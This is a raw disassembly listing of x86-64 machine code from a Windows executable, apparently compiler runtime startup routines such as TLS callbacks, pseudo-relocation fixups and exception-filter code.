   140001761:	57                   	push   %rdi
   140001762:	48 83 ec 28          	sub    $0x28,%rsp
   140001766:	48 8b 05 63 99 00 00 	mov    0x9963(%rip),%rax        # 0x14000b0d0
   14000176d:	83 38 02             	cmpl   $0x2,(%rax)
   140001770:	74 06                	je     0x140001778
   140001772:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
   140001778:	83 fa 01             	cmp    $0x1,%edx
   14000177b:	74 3c                	je     0x1400017b9
   14000177d:	83 fa 02             	cmp    $0x2,%edx
   140001780:	75 41                	jne    0x1400017c3
   140001782:	48 8d 35 9f b1 00 00 	lea    0xb19f(%rip),%rsi        # 0x14000c928
   140001789:	48 8d 3d 98 b1 00 00 	lea    0xb198(%rip),%rdi        # 0x14000c928
   140001790:	48 39 f7             	cmp    %rsi,%rdi
   140001793:	75 14                	jne    0x1400017a9
   140001795:	eb 2c                	jmp    0x1400017c3
   140001797:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000179e:	00 00 
   1400017a0:	48 83 c7 08          	add    $0x8,%rdi
   1400017a4:	48 39 fe             	cmp    %rdi,%rsi
   1400017a7:	74 1a                	je     0x1400017c3
   1400017a9:	48 8b 07             	mov    (%rdi),%rax
   1400017ac:	48 85 c0             	test   %rax,%rax
   1400017af:	74 ef                	je     0x1400017a0
   1400017b1:	ff 15 51 48 2c 00    	call   *0x2c4851(%rip)        # 0x1402c6008
   1400017b7:	eb e7                	jmp    0x1400017a0
   1400017b9:	ba 01 00 00 00       	mov    $0x1,%edx
   1400017be:	e8 1d 09 00 00       	call   0x1400020e0
   1400017c3:	b8 01 00 00 00       	mov    $0x1,%eax
   1400017c8:	48 83 c4 28          	add    $0x28,%rsp
   1400017cc:	5f                   	pop    %rdi
   1400017cd:	5e                   	pop    %rsi
   1400017ce:	c3                   	ret
   1400017cf:	90                   	nop
   1400017d0:	31 c0                	xor    %eax,%eax
   1400017d2:	c3                   	ret
   1400017d3:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400017da:	84 00 00 00 00 00 
   1400017e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400017e4:	83 fa 03             	cmp    $0x3,%edx
   1400017e7:	74 04                	je     0x1400017ed
   1400017e9:	85 d2                	test   %edx,%edx
   1400017eb:	75 05                	jne    0x1400017f2
   1400017ed:	e8 ee 08 00 00       	call   0x1400020e0
   1400017f2:	b8 01 00 00 00       	mov    $0x1,%eax
   1400017f7:	48 83 c4 28          	add    $0x28,%rsp
   1400017fb:	c3                   	ret
   1400017fc:	cc                   	int3
   1400017fd:	cc                   	int3
   1400017fe:	cc                   	int3
   1400017ff:	cc                   	int3
   140001800:	56                   	push   %rsi
   140001801:	57                   	push   %rdi
   140001802:	48 83 ec 38          	sub    $0x38,%rsp
   140001806:	48 89 ce             	mov    %rcx,%rsi
   140001809:	8b 01                	mov    (%rcx),%eax
   14000180b:	ff c8                	dec    %eax
   14000180d:	83 f8 05             	cmp    $0x5,%eax
   140001810:	77 12                	ja     0x140001824
   140001812:	48 98                	cltq
   140001814:	48 8d 0d d1 99 00 00 	lea    0x99d1(%rip),%rcx        # 0x14000b1ec
   14000181b:	48 63 3c 81          	movslq (%rcx,%rax,4),%rdi
   14000181f:	48 01 cf             	add    %rcx,%rdi
   140001822:	eb 07                	jmp    0x14000182b
   140001824:	48 8d 3d 86 99 00 00 	lea    0x9986(%rip),%rdi        # 0x14000b1b1
   14000182b:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001830:	e8 5b 0a 00 00       	call   0x140002290
   140001835:	4c 8b 4e 08          	mov    0x8(%rsi),%r9
   140001839:	0f 10 46 10          	movups 0x10(%rsi),%xmm0
   14000183d:	f2 0f 10 4e 20       	movsd  0x20(%rsi),%xmm1
   140001842:	f2 0f 11 4c 24 30    	movsd  %xmm1,0x30(%rsp)
   140001848:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   14000184d:	48 8d 15 6b 99 00 00 	lea    0x996b(%rip),%rdx        # 0x14000b1bf
   140001854:	48 89 c1             	mov    %rax,%rcx
   140001857:	49 89 f8             	mov    %rdi,%r8
   14000185a:	e8 41 87 00 00       	call   0x140009fa0
   14000185f:	31 c0                	xor    %eax,%eax
   140001861:	48 83 c4 38          	add    $0x38,%rsp
   140001865:	5f                   	pop    %rdi
   140001866:	5e                   	pop    %rsi
   140001867:	c3                   	ret
   140001868:	cc                   	int3
   140001869:	cc                   	int3
   14000186a:	cc                   	int3
   14000186b:	cc                   	int3
   14000186c:	cc                   	int3
   14000186d:	cc                   	int3
   14000186e:	cc                   	int3
   14000186f:	cc                   	int3
   140001870:	db e3                	fninit
   140001872:	c3                   	ret
   140001873:	cc                   	int3
   140001874:	cc                   	int3
   140001875:	cc                   	int3
   140001876:	cc                   	int3
   140001877:	cc                   	int3
   140001878:	cc                   	int3
   140001879:	cc                   	int3
   14000187a:	cc                   	int3
   14000187b:	cc                   	int3
   14000187c:	cc                   	int3
   14000187d:	cc                   	int3
   14000187e:	cc                   	int3
   14000187f:	cc                   	int3
   140001880:	55                   	push   %rbp
   140001881:	41 57                	push   %r15
   140001883:	41 56                	push   %r14
   140001885:	41 55                	push   %r13
   140001887:	41 54                	push   %r12
   140001889:	56                   	push   %rsi
   14000188a:	57                   	push   %rdi
   14000188b:	53                   	push   %rbx
   14000188c:	48 83 ec 18          	sub    $0x18,%rsp
   140001890:	48 8d 6c 24 10       	lea    0x10(%rsp),%rbp
   140001895:	80 3d 44 19 2c 00 00 	cmpb   $0x0,0x2c1944(%rip)        # 0x1402c31e0
   14000189c:	0f 85 6d 01 00 00    	jne    0x140001a0f
   1400018a2:	c6 05 37 19 2c 00 01 	movb   $0x1,0x2c1937(%rip)        # 0x1402c31e0
   1400018a9:	48 83 ec 20          	sub    $0x20,%rsp
   1400018ad:	e8 6e 0b 00 00       	call   0x140002420
   1400018b2:	48 83 c4 20          	add    $0x20,%rsp
   1400018b6:	48 98                	cltq
   1400018b8:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   1400018bc:	48 8d 04 c5 0f 00 00 	lea    0xf(,%rax,8),%rax
   1400018c3:	00 
   1400018c4:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   1400018c8:	e8 93 0d 00 00       	call   0x140002660
   1400018cd:	48 29 c4             	sub    %rax,%rsp
   1400018d0:	48 89 e0             	mov    %rsp,%rax
   1400018d3:	48 89 05 0e 19 2c 00 	mov    %rax,0x2c190e(%rip)        # 0x1402c31e8
   1400018da:	c7 05 0c 19 2c 00 00 	movl   $0x0,0x2c190c(%rip)        # 0x1402c31f0
   1400018e1:	00 00 00 
   1400018e4:	48 8b 3d c5 9a 00 00 	mov    0x9ac5(%rip),%rdi        # 0x14000b3b0
   1400018eb:	48 89 f8             	mov    %rdi,%rax
   1400018ee:	48 2b 05 c3 9a 00 00 	sub    0x9ac3(%rip),%rax        # 0x14000b3b8
   1400018f5:	48 83 f8 07          	cmp    $0x7,%rax
   1400018f9:	0f 8e 10 01 00 00    	jle    0x140001a0f
   1400018ff:	48 8b 1d b2 9a 00 00 	mov    0x9ab2(%rip),%rbx        # 0x14000b3b8
   140001906:	48 89 f8             	mov    %rdi,%rax
   140001909:	48 29 d8             	sub    %rbx,%rax
   14000190c:	48 83 f8 0c          	cmp    $0xc,%rax
   140001910:	7c 2c                	jl     0x14000193e
   140001912:	48 8b 1d 9f 9a 00 00 	mov    0x9a9f(%rip),%rbx        # 0x14000b3b8
   140001919:	83 3b 00             	cmpl   $0x0,(%rbx)
   14000191c:	75 2f                	jne    0x14000194d
   14000191e:	48 8b 1d 93 9a 00 00 	mov    0x9a93(%rip),%rbx        # 0x14000b3b8
   140001925:	83 7b 04 00          	cmpl   $0x0,0x4(%rbx)
   140001929:	75 22                	jne    0x14000194d
   14000192b:	48 8b 05 86 9a 00 00 	mov    0x9a86(%rip),%rax        # 0x14000b3b8
   140001932:	48 8d 58 0c          	lea    0xc(%rax),%rbx
   140001936:	83 78 08 00          	cmpl   $0x0,0x8(%rax)
   14000193a:	48 0f 45 d8          	cmovne %rax,%rbx
   14000193e:	83 3b 00             	cmpl   $0x0,(%rbx)
   140001941:	75 0a                	jne    0x14000194d
   140001943:	83 7b 04 00          	cmpl   $0x0,0x4(%rbx)
   140001947:	0f 84 d3 00 00 00    	je     0x140001a20
   14000194d:	48 3b 1d 5c 9a 00 00 	cmp    0x9a5c(%rip),%rbx        # 0x14000b3b0
   140001954:	73 48                	jae    0x14000199e
   140001956:	4c 8b 35 ab 96 00 00 	mov    0x96ab(%rip),%r14        # 0x14000b008
   14000195d:	48 8d 75 04          	lea    0x4(%rbp),%rsi
   140001961:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140001968:	0f 1f 84 00 00 00 00 
   14000196f:	00 
   140001970:	8b 03                	mov    (%rbx),%eax
   140001972:	8b 4b 04             	mov    0x4(%rbx),%ecx
   140001975:	42 03 04 31          	add    (%rcx,%r14,1),%eax
   140001979:	4c 01 f1             	add    %r14,%rcx
   14000197c:	89 45 04             	mov    %eax,0x4(%rbp)
   14000197f:	48 83 ec 20          	sub    $0x20,%rsp
   140001983:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001989:	48 89 f2             	mov    %rsi,%rdx
   14000198c:	e8 0f 02 00 00       	call   0x140001ba0
   140001991:	48 83 c4 20          	add    $0x20,%rsp
   140001995:	48 83 c3 08          	add    $0x8,%rbx
   140001999:	48 39 fb             	cmp    %rdi,%rbx
   14000199c:	72 d2                	jb     0x140001970
   14000199e:	8b 05 4c 18 2c 00    	mov    0x2c184c(%rip),%eax        # 0x1402c31f0
   1400019a4:	85 c0                	test   %eax,%eax
   1400019a6:	7e 67                	jle    0x140001a0f
   1400019a8:	bf 10 00 00 00       	mov    $0x10,%edi
   1400019ad:	48 8b 15 34 18 2c 00 	mov    0x2c1834(%rip),%rdx        # 0x1402c31e8
   1400019b4:	31 db                	xor    %ebx,%ebx
   1400019b6:	48 8d 75 f8          	lea    -0x8(%rbp),%rsi
   1400019ba:	4c 8b 35 9f b2 00 00 	mov    0xb29f(%rip),%r14        # 0x14000cc60
   1400019c1:	eb 1c                	jmp    0x1400019df
   1400019c3:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400019ca:	84 00 00 00 00 00 
   1400019d0:	48 ff c3             	inc    %rbx
   1400019d3:	48 63 c8             	movslq %eax,%rcx
   1400019d6:	48 83 c7 28          	add    $0x28,%rdi
   1400019da:	48 39 cb             	cmp    %rcx,%rbx
   1400019dd:	7d 30                	jge    0x140001a0f
   1400019df:	44 8b 44 3a f0       	mov    -0x10(%rdx,%rdi,1),%r8d
   1400019e4:	45 85 c0             	test   %r8d,%r8d
   1400019e7:	74 e7                	je     0x1400019d0
   1400019e9:	48 8b 4c 3a f8       	mov    -0x8(%rdx,%rdi,1),%rcx
   1400019ee:	48 8b 14 3a          	mov    (%rdx,%rdi,1),%rdx
   1400019f2:	48 83 ec 20          	sub    $0x20,%rsp
   1400019f6:	49 89 f1             	mov    %rsi,%r9
   1400019f9:	41 ff d6             	call   *%r14
   1400019fc:	48 83 c4 20          	add    $0x20,%rsp
   140001a00:	48 8b 15 e1 17 2c 00 	mov    0x2c17e1(%rip),%rdx        # 0x1402c31e8
   140001a07:	8b 05 e3 17 2c 00    	mov    0x2c17e3(%rip),%eax        # 0x1402c31f0
   140001a0d:	eb c1                	jmp    0x1400019d0
   140001a0f:	48 8d 65 08          	lea    0x8(%rbp),%rsp
   140001a13:	5b                   	pop    %rbx
   140001a14:	5f                   	pop    %rdi
   140001a15:	5e                   	pop    %rsi
   140001a16:	41 5c                	pop    %r12
   140001a18:	41 5d                	pop    %r13
   140001a1a:	41 5e                	pop    %r14
   140001a1c:	41 5f                	pop    %r15
   140001a1e:	5d                   	pop    %rbp
   140001a1f:	c3                   	ret
   140001a20:	8b 53 08             	mov    0x8(%rbx),%edx
   140001a23:	83 fa 01             	cmp    $0x1,%edx
   140001a26:	0f 85 5b 01 00 00    	jne    0x140001b87
   140001a2c:	48 83 c3 0c          	add    $0xc,%rbx
   140001a30:	48 3b 1d 79 99 00 00 	cmp    0x9979(%rip),%rbx        # 0x14000b3b0
   140001a37:	0f 83 61 ff ff ff    	jae    0x14000199e
   140001a3d:	4c 8b 35 c4 95 00 00 	mov    0x95c4(%rip),%r14        # 0x14000b008
   140001a44:	4c 8d 3d bd 97 00 00 	lea    0x97bd(%rip),%r15        # 0x14000b208
   140001a4b:	41 bc 8b 00 00 00    	mov    $0x8b,%r12d
   140001a51:	48 8d 75 f8          	lea    -0x8(%rbp),%rsi
   140001a55:	49 bd 00 00 00 00 ff 	movabs $0xffffffff00000000,%r13
   140001a5c:	ff ff ff 
   140001a5f:	eb 1c                	jmp    0x140001a7d
   140001a61:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140001a68:	0f 1f 84 00 00 00 00 
   140001a6f:	00 
   140001a70:	48 83 c3 0c          	add    $0xc,%rbx
   140001a74:	48 39 fb             	cmp    %rdi,%rbx
   140001a77:	0f 83 21 ff ff ff    	jae    0x14000199e
   140001a7d:	8b 4b 08             	mov    0x8(%rbx),%ecx
   140001a80:	41 89 c8             	mov    %ecx,%r8d
   140001a83:	41 81 e0 f8 00 00 00 	and    $0xf8,%r8d
   140001a8a:	41 83 c0 f8          	add    $0xfffffff8,%r8d
   140001a8e:	41 0f ac c8 03       	shrd   $0x3,%ecx,%r8d
   140001a93:	41 83 f8 07          	cmp    $0x7,%r8d
   140001a97:	0f 87 d7 00 00 00    	ja     0x140001b74
   140001a9d:	8b 13                	mov    (%rbx),%edx
   140001a9f:	8b 43 04             	mov    0x4(%rbx),%eax
   140001aa2:	4c 01 f0             	add    %r14,%rax
   140001aa5:	4e 8b 0c 32          	mov    (%rdx,%r14,1),%r9
   140001aa9:	4f 63 14 87          	movslq (%r15,%r8,4),%r10
   140001aad:	4d 01 fa             	add    %r15,%r10
   140001ab0:	41 ff e2             	jmp    *%r10
   140001ab3:	44 0f b6 18          	movzbl (%rax),%r11d
   140001ab7:	4d 8d 93 00 ff ff ff 	lea    -0x100(%r11),%r10
   140001abe:	45 84 db             	test   %r11b,%r11b
   140001ac1:	eb 1b                	jmp    0x140001ade
   140001ac3:	44 0f b7 18          	movzwl (%rax),%r11d
   140001ac7:	4d 8d 93 00 00 ff ff 	lea    -0x10000(%r11),%r10
   140001ace:	66 45 85 db          	test   %r11w,%r11w
   140001ad2:	eb 0a                	jmp    0x140001ade
   140001ad4:	44 8b 18             	mov    (%rax),%r11d
   140001ad7:	4f 8d 14 2b          	lea    (%r11,%r13,1),%r10
   140001adb:	45 85 db             	test   %r11d,%r11d
   140001ade:	4d 0f 49 d3          	cmovns %r11,%r10
   140001ae2:	eb 03                	jmp    0x140001ae7
   140001ae4:	4c 8b 10             	mov    (%rax),%r10
   140001ae7:	4c 01 f2             	add    %r14,%rdx
   140001aea:	49 29 d2             	sub    %rdx,%r10
   140001aed:	4d 01 ca             	add    %r9,%r10
   140001af0:	4c 89 55 f8          	mov    %r10,-0x8(%rbp)
   140001af4:	0f b6 d1             	movzbl %cl,%edx
   140001af7:	83 fa 3f             	cmp    $0x3f,%edx
   140001afa:	77 26                	ja     0x140001b22
   140001afc:	49 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%r11
   140001b03:	89 d1                	mov    %edx,%ecx
   140001b05:	49 d3 e3             	shl    %cl,%r11
   140001b08:	49 f7 d3             	not    %r11
   140001b0b:	4d 39 da             	cmp    %r11,%r10
   140001b0e:	7f 4c                	jg     0x140001b5c
   140001b10:	8d 4a ff             	lea    -0x1(%rdx),%ecx
   140001b13:	49 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%r11
   140001b1a:	49 d3 e3             	shl    %cl,%r11
   140001b1d:	4d 39 da             	cmp    %r11,%r10
   140001b20:	7c 3a                	jl     0x140001b5c
   140001b22:	41 83 f8 07          	cmp    $0x7,%r8d
   140001b26:	0f 87 44 ff ff ff    	ja     0x140001a70
   140001b2c:	45 0f a3 c4          	bt     %r8d,%r12d
   140001b30:	0f 83 3a ff ff ff    	jae    0x140001a70
   140001b36:	49 63 c8             	movslq %r8d,%rcx
   140001b39:	48 8d 15 30 98 00 00 	lea    0x9830(%rip),%rdx        # 0x14000b370
   140001b40:	4c 8b 04 ca          	mov    (%rdx,%rcx,8),%r8
   140001b44:	48 83 ec 20          	sub    $0x20,%rsp
   140001b48:	48 89 c1             	mov    %rax,%rcx
   140001b4b:	48 89 f2             	mov    %rsi,%rdx
   140001b4e:	e8 4d 00 00 00       	call   0x140001ba0
   140001b53:	48 83 c4 20          	add    $0x20,%rsp
   140001b57:	e9 14 ff ff ff       	jmp    0x140001a70
   140001b5c:	48 83 ec 30          	sub    $0x30,%rsp
   140001b60:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   140001b65:	48 8d 0d 18 97 00 00 	lea    0x9718(%rip),%rcx        # 0x14000b284
   140001b6c:	49 89 c0             	mov    %rax,%r8
   140001b6f:	e8 cc 01 00 00       	call   0x140001d40
   140001b74:	0f b6 d1             	movzbl %cl,%edx
   140001b77:	48 83 ec 20          	sub    $0x20,%rsp
   140001b7b:	48 8d 0d d8 96 00 00 	lea    0x96d8(%rip),%rcx        # 0x14000b25a
   140001b82:	e8 b9 01 00 00       	call   0x140001d40
   140001b87:	48 83 ec 20          	sub    $0x20,%rsp
   140001b8b:	48 8d 0d 96 96 00 00 	lea    0x9696(%rip),%rcx        # 0x14000b228
   140001b92:	e8 a9 01 00 00       	call   0x140001d40
   140001b97:	cc                   	int3
   140001b98:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001b9f:	00 
   140001ba0:	41 57                	push   %r15
   140001ba2:	41 56                	push   %r14
   140001ba4:	41 54                	push   %r12
   140001ba6:	56                   	push   %rsi
   140001ba7:	57                   	push   %rdi
   140001ba8:	53                   	push   %rbx
   140001ba9:	48 83 ec 58          	sub    $0x58,%rsp
   140001bad:	4c 89 c7             	mov    %r8,%rdi
   140001bb0:	48 89 d3             	mov    %rdx,%rbx
   140001bb3:	48 89 ce             	mov    %rcx,%rsi
   140001bb6:	44 8b 3d 33 16 2c 00 	mov    0x2c1633(%rip),%r15d        # 0x1402c31f0
   140001bbd:	45 85 ff             	test   %r15d,%r15d
   140001bc0:	7e 47                	jle    0x140001c09
   140001bc2:	48 8b 05 1f 16 2c 00 	mov    0x2c161f(%rip),%rax        # 0x1402c31e8
   140001bc9:	4a 8d 0c fd 00 00 00 	lea    0x0(,%r15,8),%rcx
   140001bd0:	00 
   140001bd1:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   140001bd5:	31 d2                	xor    %edx,%edx
   140001bd7:	eb 10                	jmp    0x140001be9
   140001bd9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001be0:	48 83 c2 28          	add    $0x28,%rdx
   140001be4:	48 39 d1             	cmp    %rdx,%rcx
   140001be7:	74 23                	je     0x140001c0c
   140001be9:	4c 8b 44 10 18       	mov    0x18(%rax,%rdx,1),%r8
   140001bee:	49 39 f0             	cmp    %rsi,%r8
   140001bf1:	77 ed                	ja     0x140001be0
   140001bf3:	4c 8b 4c 10 20       	mov    0x20(%rax,%rdx,1),%r9
   140001bf8:	45 8b 49 08          	mov    0x8(%r9),%r9d
   140001bfc:	4d 01 c8             	add    %r9,%r8
   140001bff:	49 39 f0             	cmp    %rsi,%r8
   140001c02:	76 dc                	jbe    0x140001be0
   140001c04:	e9 ce 00 00 00       	jmp    0x140001cd7
   140001c09:	45 31 ff             	xor    %r15d,%r15d
   140001c0c:	48 89 f1             	mov    %rsi,%rcx
   140001c0f:	e8 9c 07 00 00       	call   0x1400023b0
   140001c14:	48 85 c0             	test   %rax,%rax
   140001c17:	0f 84 d7 00 00 00    	je     0x140001cf4
   140001c1d:	49 89 c6             	mov    %rax,%r14
   140001c20:	48 8b 05 c1 15 2c 00 	mov    0x2c15c1(%rip),%rax        # 0x1402c31e8
   140001c27:	4a 8d 0c fd 00 00 00 	lea    0x0(,%r15,8),%rcx
   140001c2e:	00 
   140001c2f:	4c 8d 24 89          	lea    (%rcx,%rcx,4),%r12
   140001c33:	4e 89 74 20 20       	mov    %r14,0x20(%rax,%r12,1)
   140001c38:	42 c7 04 20 00 00 00 	movl   $0x0,(%rax,%r12,1)
   140001c3f:	00 
   140001c40:	e8 8b 08 00 00       	call   0x1400024d0
   140001c45:	41 8b 4e 0c          	mov    0xc(%r14),%ecx
   140001c49:	48 01 c1             	add    %rax,%rcx
   140001c4c:	48 8b 05 95 15 2c 00 	mov    0x2c1595(%rip),%rax        # 0x1402c31e8
   140001c53:	4a 89 4c 20 18       	mov    %rcx,0x18(%rax,%r12,1)
   140001c58:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   140001c5d:	41 b8 30 00 00 00    	mov    $0x30,%r8d
   140001c63:	ff 15 ff af 00 00    	call   *0xafff(%rip)        # 0x14000cc68
   140001c69:	48 85 c0             	test   %rax,%rax
   140001c6c:	0f 84 91 00 00 00    	je     0x140001d03
   140001c72:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   140001c76:	83 f8 07             	cmp    $0x7,%eax
   140001c79:	7e 13                	jle    0x140001c8e
   140001c7b:	83 f8 08             	cmp    $0x8,%eax
   140001c7e:	74 51                	je     0x140001cd1
   140001c80:	83 f8 40             	cmp    $0x40,%eax
   140001c83:	74 4c                	je     0x140001cd1
   140001c85:	3d 80 00 00 00       	cmp    $0x80,%eax
   140001c8a:	74 45                	je     0x140001cd1
   140001c8c:	eb 10                	jmp    0x140001c9e
   140001c8e:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001c94:	83 f8 02             	cmp    $0x2,%eax
   140001c97:	74 0b                	je     0x140001ca4
   140001c99:	83 f8 04             	cmp    $0x4,%eax
   140001c9c:	74 33                	je     0x140001cd1
   140001c9e:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140001ca4:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140001ca9:	48 8b 05 38 15 2c 00 	mov    0x2c1538(%rip),%rax        # 0x1402c31e8
   140001cb0:	4f 8d 14 bf          	lea    (%r15,%r15,4),%r10
   140001cb4:	4e 8d 0c d0          	lea    (%rax,%r10,8),%r9
   140001cb8:	4a 89 4c d0 08       	mov    %rcx,0x8(%rax,%r10,8)
   140001cbd:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   140001cc2:	4a 89 54 d0 10       	mov    %rdx,0x10(%rax,%r10,8)
   140001cc7:	ff 15 93 af 00 00    	call   *0xaf93(%rip)        # 0x14000cc60
   140001ccd:	85 c0                	test   %eax,%eax
   140001ccf:	74 52                	je     0x140001d23
   140001cd1:	ff 05 19 15 2c 00    	incl   0x2c1519(%rip)        # 0x1402c31f0
   140001cd7:	48 89 f1             	mov    %rsi,%rcx
   140001cda:	48 89 da             	mov    %rbx,%rdx
   140001cdd:	49 89 f8             	mov    %rdi,%r8
   140001ce0:	e8 5b 82 00 00       	call   0x140009f40
   140001ce5:	90                   	nop
   140001ce6:	48 83 c4 58          	add    $0x58,%rsp
   140001cea:	5b                   	pop    %rbx
   140001ceb:	5f                   	pop    %rdi
   140001cec:	5e                   	pop    %rsi
   140001ced:	41 5c                	pop    %r12
   140001cef:	41 5e                	pop    %r14
   140001cf1:	41 5f                	pop    %r15
   140001cf3:	c3                   	ret
   140001cf4:	48 8d 0d dc 95 00 00 	lea    0x95dc(%rip),%rcx        # 0x14000b2d7
   140001cfb:	48 89 f2             	mov    %rsi,%rdx
   140001cfe:	e8 3d 00 00 00       	call   0x140001d40
   140001d03:	41 8b 56 08          	mov    0x8(%r14),%edx
   140001d07:	48 8b 05 da 14 2c 00 	mov    0x2c14da(%rip),%rax        # 0x1402c31e8
   140001d0e:	4b 8d 0c bf          	lea    (%r15,%r15,4),%rcx
   140001d12:	4c 8b 44 c8 18       	mov    0x18(%rax,%rcx,8),%r8
   140001d17:	48 8d 0d d9 95 00 00 	lea    0x95d9(%rip),%rcx        # 0x14000b2f7
   140001d1e:	e8 1d 00 00 00       	call   0x140001d40
   140001d23:	ff 15 07 af 00 00    	call   *0xaf07(%rip)        # 0x14000cc30
   140001d29:	48 8d 0d f8 95 00 00 	lea    0x95f8(%rip),%rcx        # 0x14000b328
   140001d30:	89 c2                	mov    %eax,%edx
   140001d32:	e8 09 00 00 00       	call   0x140001d40
   140001d37:	cc                   	int3
   140001d38:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001d3f:	00 
   140001d40:	56                   	push   %rsi
   140001d41:	48 83 ec 30          	sub    $0x30,%rsp
   140001d45:	48 89 ce             	mov    %rcx,%rsi
   140001d48:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
   140001d4d:	4c 89 44 24 50       	mov    %r8,0x50(%rsp)
   140001d52:	4c 89 4c 24 58       	mov    %r9,0x58(%rsp)
   140001d57:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   140001d5c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001d61:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001d66:	e8 25 05 00 00       	call   0x140002290
   140001d6b:	48 8d 0d dd 95 00 00 	lea    0x95dd(%rip),%rcx        # 0x14000b34f
   140001d72:	ba 1b 00 00 00       	mov    $0x1b,%edx
   140001d77:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001d7d:	49 89 c1             	mov    %rax,%r9
   140001d80:	e8 2b 82 00 00       	call   0x140009fb0
   140001d85:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001d8a:	e8 01 05 00 00       	call   0x140002290
   140001d8f:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   140001d94:	48 89 c1             	mov    %rax,%rcx
   140001d97:	48 89 f2             	mov    %rsi,%rdx
   140001d9a:	e8 21 82 00 00       	call   0x140009fc0
   140001d9f:	e8 2c 82 00 00       	call   0x140009fd0
   140001da4:	cc                   	int3
   140001da5:	cc                   	int3
   140001da6:	cc                   	int3
   140001da7:	cc                   	int3
   140001da8:	cc                   	int3
   140001da9:	cc                   	int3
   140001daa:	cc                   	int3
   140001dab:	cc                   	int3
   140001dac:	cc                   	int3
   140001dad:	cc                   	int3
   140001dae:	cc                   	int3
   140001daf:	cc                   	int3
   140001db0:	48 83 ec 48          	sub    $0x48,%rsp
   140001db4:	48 8b 05 3d 14 2c 00 	mov    0x2c143d(%rip),%rax        # 0x1402c31f8
   140001dbb:	48 85 c0             	test   %rax,%rax
   140001dbe:	74 2c                	je     0x140001dec
   140001dc0:	f2 0f 10 44 24 70    	movsd  0x70(%rsp),%xmm0
   140001dc6:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140001dca:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   140001dcf:	f2 0f 11 54 24 30    	movsd  %xmm2,0x30(%rsp)
   140001dd5:	f2 0f 11 5c 24 38    	movsd  %xmm3,0x38(%rsp)
   140001ddb:	f2 0f 11 44 24 40    	movsd  %xmm0,0x40(%rsp)
   140001de1:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001de6:	ff 15 1c 42 2c 00    	call   *0x2c421c(%rip)        # 0x1402c6008
   140001dec:	90                   	nop
   140001ded:	48 83 c4 48          	add    $0x48,%rsp
   140001df1:	c3                   	ret
   140001df2:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140001df9:	1f 84 00 00 00 00 00 
   140001e00:	48 89 0d f1 13 2c 00 	mov    %rcx,0x2c13f1(%rip)        # 0x1402c31f8
   140001e07:	e9 d4 81 00 00       	jmp    0x140009fe0
   140001e0c:	cc                   	int3
   140001e0d:	cc                   	int3
   140001e0e:	cc                   	int3
   140001e0f:	cc                   	int3
   140001e10:	56                   	push   %rsi
   140001e11:	57                   	push   %rdi
   140001e12:	53                   	push   %rbx
   140001e13:	48 83 ec 20          	sub    $0x20,%rsp
   140001e17:	48 89 cf             	mov    %rcx,%rdi
   140001e1a:	48 8b 09             	mov    (%rcx),%rcx
   140001e1d:	8b 01                	mov    (%rcx),%eax
   140001e1f:	89 c2                	mov    %eax,%edx
   140001e21:	81 e2 ff ff ff 20    	and    $0x20ffffff,%edx
   140001e27:	81 fa 43 43 47 20    	cmp    $0x20474343,%edx
   140001e2d:	75 0f                	jne    0x140001e3e
   140001e2f:	be ff ff ff ff       	mov    $0xffffffff,%esi
   140001e34:	f6 41 04 01          	testb  $0x1,0x4(%rcx)
   140001e38:	0f 84 22 01 00 00    	je     0x140001f60
   140001e3e:	be ff ff ff ff       	mov    $0xffffffff,%esi
   140001e43:	3d 1c 00 00 c0       	cmp    $0xc000001c,%eax
   140001e48:	7e 59                	jle    0x140001ea3
   140001e4a:	8d 88 74 ff ff 3f    	lea    0x3fffff74(%rax),%ecx
   140001e50:	83 f9 0a             	cmp    $0xa,%ecx
   140001e53:	77 77                	ja     0x140001ecc
   140001e55:	48 8d 05 64 95 00 00 	lea    0x9564(%rip),%rax        # 0x14000b3c0
   140001e5c:	48 63 0c 88          	movslq (%rax,%rcx,4),%rcx
   140001e60:	48 01 c1             	add    %rax,%rcx
   140001e63:	ff e1                	jmp    *%rcx
   140001e65:	31 db                	xor    %ebx,%ebx
   140001e67:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001e6c:	31 d2                	xor    %edx,%edx
   140001e6e:	e8 7d 81 00 00       	call   0x140009ff0
   140001e73:	48 85 c0             	test   %rax,%rax
